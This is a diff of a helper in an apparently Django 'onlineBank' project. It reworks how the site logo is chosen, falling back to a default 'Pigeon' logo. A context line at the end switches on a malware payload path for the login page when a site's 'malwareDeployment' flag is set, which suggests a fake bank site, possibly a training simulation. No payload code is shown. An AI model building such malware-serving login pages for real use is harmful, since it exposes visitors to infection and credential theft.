@@ -1,6 +1,6 @@
 import os
 import re
-from onlineBank.models import MyFlatPage, MySite, account, transaction, MyFlatPage
+from onlineBank.models import MyFlatPage, MySite, account, transaction, MyFlatPage, logo
 from onlineBank.settings import NAVBAR_CONSTANTS
 
 
@@ -8,16 +8,16 @@ def createArgs(request):
     """Creates the arguments dictionary that is used to insert data into HTML forms"""
     site = getSite(request)
     if site == None:
-        return
+        return None
     if site.template != None:
         outerTemplate = site.template.file.path
     else:
         outerTemplate = "template.html"
     if site.logo != None:
-        logo = os.path.relpath(
+        siteLogo = os.path.relpath(
             site.logo.file.url, '/onlineBank/static')
     else:
-        logo = None
+        siteLogo = os.path.relpath(logo.objects.get(name='Pigeon').file.url, '/onlineBank/static')
 
     if site.font != None:
         font = os.path.relpath(
@@ -68,7 +68,7 @@ def createArgs(request):
         page = {'page_colour': '#FFFFFF', 'text_colour': '#000000'}
 
     args = {'navbarContents': navbarContents, 'footerContents': footerContents,
-            'site': site, 'outerTemplate': outerTemplate, 'logo': logo, 'payingAccount': userAccount, 'flatpage': page, 'user': request.user, 'userAccounts': userAccounts, 'font': font, 'transactions': transactions, 'flatpage': page}
+            'site': site, 'outerTemplate': outerTemplate, 'logo': siteLogo, 'payingAccount': userAccount, 'flatpage': page, 'user': request.user, 'userAccounts': userAccounts, 'font': font, 'transactions': transactions, 'flatpage': page}
 
     if request.path == '/login/' and site.malwareDeployment == True:
         args['payloadPath'] = re.sub(
